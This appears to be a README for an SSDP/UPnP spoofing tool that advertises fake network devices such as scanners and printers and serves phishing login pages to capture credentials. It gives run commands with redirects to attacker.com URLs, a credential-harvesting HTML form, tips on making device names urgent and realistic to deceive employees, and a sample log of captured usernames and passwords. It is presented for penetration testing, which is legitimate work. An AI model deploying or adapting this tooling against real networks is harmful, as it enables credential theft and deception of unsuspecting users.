# Flask Evil SSDP - Multi-Template UPnP Spoofing Server

A sophisticated multi-template UPnP (Universal Plug and Play) spoofing framework designed for network penetration testing and security research. This tool leverages SSDP (Simple Service Discovery Protocol) to impersonate legitimate network devices and capture credentials through convincing phishing pages.

**Credits**: This project is inspired by and based on the excellent work from [evil-ssdp](https://github.com/initstring/evil-ssdp/tree/master).

---

## Features

- **Multi-Template Support**: Run multiple fake device templates simultaneously on a single server
- **SSDP Spoofing**: Responds to UPnP discovery requests and masquerades as legitimate devices
- **Credential Harvesting**: Captures credentials through phishing forms
- **Customizable Devices**: Create templates for any UPnP device type (printers, scanners, routers, etc.)
- **Flexible Redirects**: Route victims to custom URLs after credential submission
- **Analyze Mode**: Passive monitoring without active SSDP responses

---

## Installation

### Requirements

```bash
python3 >= 3.7
flask
netifaces
```

### Setup

```bash
git clone <repository>
cd flask-evil-ssdp
pip install -r requirements.txt
```

---

## Usage

### Basic Example

```bash
sudo python3 main.py eth0 -t scanner -p 8888
```

### Parameters

| Argument | Description | Example |
|----------|-------------|---------|
| `interface` | Network interface to bind to | `eth0`, `wlan0` |
| `-p, --port` | HTTP server port | `-p 8888` |
| `-t, --templates` | Template names (space-separated) or `all` | `-t scanner printer` |
| `-s, --smb` | SMB server IP for embedded resources | `-s 192.168.1.100` |
| `-u, --urls` | Custom redirect URLs for each template | `-u http://attacker.com/redirect` |
| `-a, --analyze` | Analyze mode (no SSDP responses) | `-a` |
| `-L, --list` | List available templates | `-L` |

### Advanced Examples

```bash
# Run all templates on interface eth0
sudo python3 main.py eth0 -t all -p 8888

# Run specific templates with custom redirects
sudo python3 main.py eth0 -t scanner printer -u "http://attacker.com/1" "http://attacker.com/2"

# Analyze mode - only listen, don't respond
sudo python3 main.py eth0 -t scanner -a

# Specify SMB server for embedded resources
sudo python3 main.py eth0 -t scanner -s 192.168.1.50

# List available templates
python3 main.py -L
```

---

## Understanding device.xml

The `device.xml` file is the UPnP device description document. It defines how your fake device will be advertised on the network.

### Key Elements

```xml
<presentationURL>http://{{ local_ip }}:{{ local_port }}/ssdp/{{ template_idx }}/present.html</presentationURL>
```
URL of the phishing login page served to victims. The `{{ template_idx }}` allows multiple templates to have different presentation URLs.

```xml
<deviceType>urn:schemas-upnp-org:device:Scanner:1</deviceType>
<friendlyName>Corporate Scanner [3 NEW SCANS WAITING]</friendlyName>
```
Device type and display name. The friendly name should be contextual and create urgency to increase social engineering effectiveness.

```xml
<manufacturer>Xerox</manufacturer>
<modelName>ScanMaster5000</modelName>
```
Device metadata that increases legitimacy. Customize these to match real devices in the target environment.

```xml
<UDN>{{ session_usn }}</UDN>
```
Unique Device Name - replaced with a generated UUID at runtime.

### Customization Tips

1. Change the `deviceType` to match your target environment
2. Use realistic `friendlyName` values that employees would recognize
3. Adjust `manufacturer` and `modelName` to match common devices in your test environment

---

## Understanding present.html

The `present.html` file is the phishing login page served to victims.

### Credential Capture Form

```html
<form method="POST" action="/ssdp/{{ template_idx }}/hook.html" name="LoginForm">
  <input type="username" name="username" placeholder="Username" />
  <input type="password" name="password" placeholder="Password" />
  <input type="submit" value="Log in" />
</form>
```

When submitted:
- User credentials are POSTed to `/ssdp/{{ template_idx }}/hook.html`
- The server captures and logs the credentials with timestamp and source IP
- User is redirected (to create the illusion of successful login)

---

## Template Structure

Each template should have the following directory structure:

```
templates/
├── office365/
│   ├── device.xml
│   ├── present.html
│   ├── logo.png
│   ├── script.js
│   └── style.css
├── scanner/
│   ├── device.xml
│   ├── present.html
│   └── style.css
```

---

## Logging

All captured events are logged to `logs-essdp.txt` with timestamps:

```
2024-01-15 14:23:45:    [*] Credentials captured [Template 0: scanner] - Host: 192.168.1.50
2024-01-15 14:23:45:      username: john.doe
2024-01-15 14:23:45:      password: SecurePass123!
```

---

## Common UPnP Device Types

| Device | URN |
|--------|-----|
| Scanner | `urn:schemas-upnp-org:device:Scanner:1` |
| Printer | `urn:schemas-upnp-org:device:Printer:1` |
| Router | `urn:schemas-upnp-org:device:InternetGatewayDevice:1` |
| Media Server | `urn:schemas-upnp-org:device:MediaServer:1` |
| Camera | `urn:schemas-upnp-org:device:DigitalSecurityCamera:1` |
| Light | `urn:schemas-upnp-org:device:BinaryLight:1` |

---

## References

- [Valerchk - O365 Phishing Page](https://github.com/Valerchk/Microsoft-Page-tester)